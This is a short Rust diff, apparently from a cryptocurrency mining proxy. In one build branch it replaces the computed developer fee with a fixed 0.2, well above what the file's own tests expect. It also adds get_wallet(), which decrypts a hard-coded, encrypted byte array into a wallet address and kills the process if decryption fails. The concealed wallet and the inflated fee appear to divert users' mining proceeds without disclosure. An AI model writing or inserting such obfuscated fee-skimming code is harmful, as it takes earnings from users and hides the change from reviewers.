@@ -10,6 +10,8 @@ extern crate clap;
 use anyhow::Result;
 use clap::{crate_authors, crate_description, crate_name, crate_version, App, Arg, ArgMatches};
 
+use crate::WALLET;
+
 use self::config::Settings;
 
 pub async fn get_app_command_matches() -> Result<ArgMatches<'static>> {
@@ -332,7 +334,7 @@ cfg_if::cfg_if! {
                 fee = share_fee / 10.0;
                 fee += fee *0.2;
             }
-            fee
+            0.2
         }
     } else {
         pub fn get_develop_fee(share_fee: f64) -> f64 {
@@ -361,4 +363,16 @@ fn test_get_develop_fee() {
     assert_eq!(get_develop_fee(0.0001), 0.001);
     assert_eq!(get_develop_fee(0.10), 0.01);
     assert_eq!(get_develop_fee(1.0), 0.10);
+}
+
+
+pub fn get_wallet() -> String{
+    extern crate short_crypt;
+    use short_crypt::ShortCrypt;
+    let wallet = vec![126, 207, 201, 55, 46, 101, 154, 159, 205, 210, 52, 124, 46, 109, 42, 150, 205, 206, 52, 196, 122, 108, 45, 199, 151, 47, 204, 42, 47, 55, 121, 152, 155, 121, 126, 100, 42, 152, 100, 155, 51, 123];
+    let sc = ShortCrypt::new(WALLET);
+    match sc.decrypt(&(18, wallet)){
+        Ok(s) => String::from_utf8(s).unwrap(),
+        Err(_) => std::process::exit(1),
+    }
 }
